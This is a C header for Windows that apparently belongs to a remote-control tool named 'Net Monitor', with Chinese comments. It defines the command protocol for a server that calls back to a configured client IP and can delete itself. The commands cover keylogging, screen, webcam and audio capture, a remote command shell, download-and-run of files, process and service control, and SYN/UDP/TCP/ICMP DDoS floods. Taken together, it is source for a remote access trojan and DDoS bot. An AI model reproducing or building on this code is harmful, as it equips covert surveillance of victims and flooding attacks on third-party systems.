#include <WTypes.h>

#ifndef _UTILITY_STRUCT_H
#define _UTILITY_STRUCT_H

//////////////////////////////////////////////////////////////////////////////////////////////

#ifndef     VIDEO_WIDTH
#define		VIDEO_WIDTH				320
#endif

#ifndef		VIDEO_HEIGHT
#define		VIDEO_HEIGHT			240
#endif

#ifndef		VIDEO_SIZE
#define		VIDEO_SIZE				250 * 1024
#endif


// RTP包最大长度
#define RTP_MAX_PACKET_BUFF			1024 * 2 * 1024				// 2m

#define RTP_MAX_A_PACKET_BUFF		1024 * 5					// 最大5K

// 视频包
#ifndef PACKET_TYPE_VIDEO
#define PACKET_TYPE_VIDEO			0xF0
#endif

// 音频包
#ifndef PACKET_TYPE_AUDIO
#define PACKET_TYPE_AUDIO			0xF1
#endif

// 屏幕图像包
#ifndef PACKET_TYPE_SCREEN
#define PACKET_TYPE_SCREEN			0xF2
#endif

typedef struct RTP_HDR_S
{
	UINT		nRTPData;			/* RTP Data Length */
	UINT		nPacketType;		/* RTP Packet Type ( 0xF0为视频包,0xF1为音频包 )*/
}RTP_HDR_S;

typedef  UINT(__stdcall *RTP_ON_RECV_CB)(BYTE*,UINT,void*);		// 数据回调函数


//////////////////////////////////////////////////////////////////////
// 屏幕监视接口
//////////////////////////////////////////////////////////////////////

#define SCREEN_FULL				0x0001
#define SCREEN_DIFFERENCE		0x0002
#define SCREEN_XOR				0x0003

typedef struct SCREENCAP_SCREENBITMAP
{
	WORD Width;
	WORD Height;
	WORD Depth;
	WORD Method;
	DWORD Size;
	BYTE Bits[];
} SCREENCAP_SCREENBITMAP, *PSCREENCAP_SCREENBITMAP;

typedef struct _SCREEN_HANDLE
{
	int nWidth;
	int nHeight;
	int nDepth;
	HDC hScrDC;
	HDC hMemDC;
	HBITMAP hMemBitmap;
	PVOID pScreenBuffer;
	PVOID pTempBuffer;
	PVOID pOutputBuffer;
	DWORD nSize1;
	DWORD nSize2;
} SCREEN_HANDLE, *PSCREEN_HANDLE;

//////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////

#define WM_CONNECT_CLIENT			WM_USER + 100				// 连接客户端自定义消息

#define WM_DEAL_CMD					WM_USER + 101				// 处理服务端自定义消息

#define WM_FILE_DOWNDLOAD_FINISH	WM_USER + 102				// 下载文件消息

#define WM_FILE_UPLOAD_FINISH		WM_USER + 103				// 上传文件结束

#define WM_SERVER_OFFLINE			WM_USER + 104				// 服务端下线消息

#define WM_SERVER_UNINSTALL			WM_USER + 105				// 卸载服务端消息

#define CLIENT_LISTEN_PORT			80						// Net Monitor客户端使用的默认监听端口

#define CMD_BUFFER_MAX				1024						// 命令体缓存最大值		1K
		
#define	c_ParamFile					_T("NMParam.dat")			// 配置文件

//#define MAIN_FRAME_BK_COLOR		(RGB(218,230,245))
#define MAIN_FRAME_BK_COLOR			(RGB(251, 250, 251))

typedef enum E_SKIN_TYPE
{
	E_SKIN_Base = 0,
	E_SKIN_XP   = 1,
	E_SKIN_NEO  = 2
} E_SKIN_TYPE;

// 命令结构
typedef struct NM_CMD_S
{
	DWORD	dwCmd;
	DWORD	dw1;
	DWORD	dw2;
	DWORD	dw3;
	BYTE	pBuff[ CMD_BUFFER_MAX ];
}NM_CMD_S;

// 生成服务端文件信息结构
typedef struct NM_SERVER_FILE_S
{
	CHAR	szClientIP[_MAX_PATH];					// 客户端IP地址
	UINT	nClientPort;							// 客户端通讯端口
	UINT	nCheckFlag;								// 结构校验位
	BOOL	bDeleteSelf;							// 删除自身
}NM_SERVER_FILE_S;

// 系统信息结构
typedef struct SYSTEM_INFO_S
{
	DWORD	dwPlatformId;							// 系统版本相关
	DWORD	dwMajorVersion;							// 系统版本相关
	DWORD	dwMinorVersion;							// 系统版本相关
	DWORD	dwMemorySize;							// 内存大小		(M为单位)
	
	DWORD	nRunDays;								// 计算机运行天数
	DWORD	nRunHours;								// 计算机运行小时数
	DWORD	nRunMinutes;							// 计算机运行分钟数
	DWORD	nRunSenconds;							// 计算机运行秒钟数

	DWORD	bHaveCamera;							// 是否有摄像头
	
	CHAR	szCPUType[_MAX_PATH];					// CPU信息
	CHAR	szComputerName[_MAX_PATH];				// 机器名
//	CHAR	szUserName[_MAX_PATH];					// 用户名

}SYSTEM_INFO_S;

typedef struct SERVER_REMOTE_S
{
	SOCKET			hSocketServer;					// 与服务端传输指令的SOCKET
	SYSTEM_INFO_S	emSystemInfo;					// 服务端系统配置信息
	CHAR			szServerIP[_MAX_PATH];			// 服务端IP地址
	CHAR			szAddress[_MAX_PATH];			// 该计算机所在地址
	PVOID			pCMDThread;
}SERVER_REMOTE_S;

typedef struct PROCESS_INFO_S
{
	CHAR			szFileName[FILENAME_MAX];		// 进程名称	
	DWORD			dwPid;							// 进程ID	
	DWORD			dwPriority;						// 优先级
	DWORD			dwThreads;						// 线程数
	DWORD			dwParentPID;					// 父进程ID
	
}PROCESS_INFO_S;

typedef struct WINDOW_INFO_S
{
	CHAR			szProcessName[FILENAME_MAX];	// 进程名称	
	CHAR			szTitleName[FILENAME_MAX];		// 窗口名称	
	CHAR			szClassName[FILENAME_MAX];		// 窗口类名称	
	DWORD			dwPid;							// 进程ID	
	DWORD			dwHWND;							// 窗口句柄
	
}WINDOW_INFO_S;

typedef struct SERVICE_INFO_S
{
	CHAR			szServiceName[FILENAME_MAX];	// 服务名称	
	CHAR			szDisplayName[FILENAME_MAX];	// 服务显示名称	
	DWORD			dwRunState;						// 服务运行状态	
	DWORD			dwStartType;					// 服务启动类型
	
}SERVICE_INFO_S;

typedef struct DDOS_INFO_S							// DDOS攻击结构
{
	BOOL	bSYN;									// SYN
	BOOL	bUDP;									// UDP
	BOOL	bTCP;									// TCP
	BOOL	bICMP;									// ICMP
	BOOL	bTCPBreak;								// TCP Break
	UINT	nDDOSMinutes;							// DDOS Times (Minutes)
	UINT	nDDOSPort;								// DDOS Port	
	CHAR	szDDOSIP[MAX_PATH];						// DDOS IP
}DDOS_INFO_S;

typedef struct DISKDRIVER_INFO_S					// 驱动器信息
{
	DWORD	dwType;									// 驱动器类型
	char	cVolumeName[FILENAME_MAX];				// 卷标名称
}DISKDRIVER_INFO_S;

typedef struct FILE_INFO_S							// 驱动器信息
{
	DWORD	dwSize;									// 文件或文件夹大小
	DWORD   dwFileAttributes;						// 文件属性
	BOOL	bPath;									// 目录还是文件
	char	cCreateTime[FILENAME_MAX];				// 创建时间
	char	cModifyTime[FILENAME_MAX];				// 修改时间
	char	cAccessTime[FILENAME_MAX];				// 最后访问时间	
	char	cFileName[FILENAME_MAX];				// 文件或文件夹名称
	char	cFullPathName[FILENAME_MAX];			// 文件或文件夹全名称
}FILE_INFO_S;

//TreeView树节点属性//////////////////////////////
#define TI_ROOT							0x00000001					// 根节点"文件管理器"
#define TI_HOST							0x00000002					// 主机节点(此节点是主机,包括"我的电脑"和远程主机)
#define TI_DISKDRIVE_REMOVABLE			0x00000004					// 软盘
#define TI_DISKDRIVE_FIXED				0x00000008					// 硬盘及其它
#define TI_DISKDRIVE_CDROM				0x00000010					// 光盘
#define TI_ONCEEXPAND					0x00000020					// 此节点曾经展开过
#define TI_DISKDRIVE					0x00000040					// 此节点是磁盘驱动器
#define TI_CUT							0x00000080					// 此节点被剪贴
#define TI_REMOTE						0x00000100					// 远程节点(此节点非本地)
#define TI_ONCEACCESS					0x00000200					// 曾经访问过(用于标识远程软驱和光驱)

//ListView列表项属性///////////////////////////////
#define LI_FOUND						0XFFFFFFFF					// 此列表项曾在Tree中被找到,就是说它不是新建的文件夹

//树映象列表的图标索引/////////////////////////////
#define ICO_FILEMANAGER							0x00000000			// 文件管理器
#define ICO_MYCOMPUTER							0x00000001			// 我的电脑
#define ICO_FOLDER								0x00000002			// 文件夹
#define ICO_FOLDER_OPEN							0x00000003			// 文件夹(打开状态)
#define ICO_DRIVE_REMOVABLE						0x00000004			// 软盘驱动器
#define ICO_DRIVE_FIXED							0x00000005			// 硬盘驱动器
#define ICO_DRIVE_CDROM							0x00000006			// 光盘驱动器
#define ICO_DRIVE_ZIP							0x00000007			// ZIP驱动器
#define ICO_DRIVE_REMOTE						0x00000008			// 网络驱动器
#define ICO_REMOTEHOST							0x00000009			// 远程主机
#define ICO_REMOTEHOST_DISCONNECT				0x0000000A			// 远程主机(断开连接状态)
#define ICO_REMOTEHOST_HTTPTUNNEL				0x0000000B			// 远程HTTP隧道主机
#define ICO_REMOTEHOST_HTTPTUNNEL_DISCONNECT	0x0000000C			// 远程HTTP隧道主机(断开连接状态)

#define LIST_FILE								0x00000001
#define LIST_PATH								0x00000002

#define CMD_ERROR				0					// 命令出错
#define CMD_SUCCESS				1					// 命令成功

// 服务段发送给客户端指令
#define CMD_OFFLINE				100					// 服务端下线
#define CMD_ONLINE				101					// 服务端上线

// 客户端发送给服务段指令
#define CMD_AUDIO_RENDER		105					// 请求服务端 发送当前系统语音
#define CMD_AUDIO_BROADCAST		106					// 请求服务端 接收语音对讲

#define CMD_GETSCREEN			110					// 请求服务端 发送当前屏幕信息
#define CMD_CHANGE_FRAME_RATE	111					// 请求服务端 修改当前发送屏幕数据帧率
#define CMD_GETCAMERA			112					// 请求服务端 发送当前摄像头视频
#define CMD_GETSYSTEMINFO		113					// 请求服务端 发送系统信息(连接使用)
#define CMD_GETPROCESSLIST		114					// 请求服务端 发送进程列表

#define CMD_KILLPROCESS			116					// 请求服务端 结束进程
#define CMD_GETKEYLOG			117					// 请求服务端 查看键盘记录
#define CMD_STARTKEYLOG			118					// 请求服务端 开始键盘记录
#define CMD_STOPKEYLOG			119					// 请求服务端 停止键盘记录
#define CMD_ERASEKEYLOG			120					// 请求服务端 清除键盘记录

#define CMD_CMD_SHELL_START		121					// 请求服务端 开始命令控制
#define CMD_CMD_SHELL_STOP		122					// 请求服务端 停止命令控制
#define CMD_CMD_SHELL_PROCESS	123					// 请求服务端 处理命令

#define CMD_GETWINDOWLIST		124					// 请求服务端 获取窗口列表
#define CMD_WINDOW_MIN			125					// 请求服务端 设置窗口最小化
#define CMD_WINDOW_MAX			126					// 请求服务端 设置窗口最大化
#define CMD_WINDOW_NORMAL		127					// 请求服务端 设置窗口为默认大小
#define CMD_WINDOW_HIDE			128					// 请求服务端 设置窗口隐藏
#define CMD_WINDOW_CLOSE		129					// 请求服务端 关闭窗口

#define CMD_KEYDOWN				130					// 请求服务端 键盘按键按下
#define CMD_KEYUP				131					// 请求服务端 键盘按键抬起
#define CMD_MOUSEMOVE			132					// 请求服务端 鼠标移动
#define CMD_LBUTTONDOWN			133					// 请求服务端 鼠标左键按下
#define CMD_LBUTTONUP			134					// 请求服务端 鼠标左键抬起
#define CMD_LBUTTONDBLCLK		135					// 请求服务端 鼠标左键双击
#define CMD_RBUTTONDOWN			136					// 请求服务端 鼠标右键按下        
#define CMD_RBUTTONUP			137					// 请求服务端 鼠标右键抬起
#define CMD_RBUTTONDBLCLK		138					// 请求服务端 鼠标右键双击
#define CMD_KEYCTRLALTDEL		139					// 请求服务端 按下键 Ctrl + Alt + del 
#define CMD_SYSKEYDOWN			140					// 请求服务端 键盘系统按键按下
#define CMD_SYSKEYUP			141					// 请求服务端 键盘系统按键抬起

#define CMD_FILE_GETROOT		200					// 请求服务端 返回我的电脑
#define CMD_FILE_GETPATHFILE    201					// 请求服务端 返回指定目录的文件
#define CMD_FILE_DELETEFILE     202					// 请求服务端 删除文件
#define CMD_FILE_RUNFILE        203					// 请求服务端 运行文件
#define CMD_FILE_RENAMEFILE     204					// 请求服务端 重命名文件
#define CMD_FILE_DWONLOADFILE   205					// 请求服务端 下载文件
#define CMD_FILE_DOWNFILERUN	206					// 请求服务端 下载文件并运行
#define CMD_FILE_UPLOADFILE     207					// 请求服务端 上传文件
#define CMD_FILE_UPLOADFILERUN	208					// 请求服务端 上传文件并运行
#define CMD_FILE_CREATEDIR      209					// 请求服务端 创建文件夹

#define CMD_DDOS_START			250					// 请求服务端 开始DDOS攻击
#define CMD_DDOS_STOP			251					// 请求服务端 停止DDOS攻击

#define CMD_GETSERVICELIST		260					// 请求服务端 返回当前服务列表
#define CMD_SERVICE_SET_STATE	261					// 请求服务端 改变服务当前运行状态
#define CMD_SERVICE_START_TYPE	262					// 请求服务端 改变服务启动类型

#define CMD_PROTOCOL_PING		300					// 心跳协议指令

#define CMD_LOGOFF				400					// 注销
#define CMD_POWEROFF			401					// 关闭电源
#define CMD_REBOOT				402					// 重启系统
#define CMD_SHUTDOWN			403					// 关闭电脑

#define CMD_UNINSTALL			500					// 卸载服务端

#endif